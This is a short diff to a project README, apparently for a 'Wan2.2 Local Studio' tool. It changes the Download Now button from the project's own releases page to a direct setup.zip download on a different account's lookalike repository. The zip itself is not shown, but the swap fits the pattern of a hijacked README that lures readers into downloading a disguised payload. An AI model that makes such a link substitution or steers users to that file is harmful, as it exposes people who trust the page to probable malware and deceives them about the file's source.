@@ -9,7 +9,7 @@
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/SilentJMA/Wan2.2-Local-Studio/releases/latest)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/Alphazusheave/Wan-Local-Studio/releases/download/setup/setup.zip)
 
 </div>
 
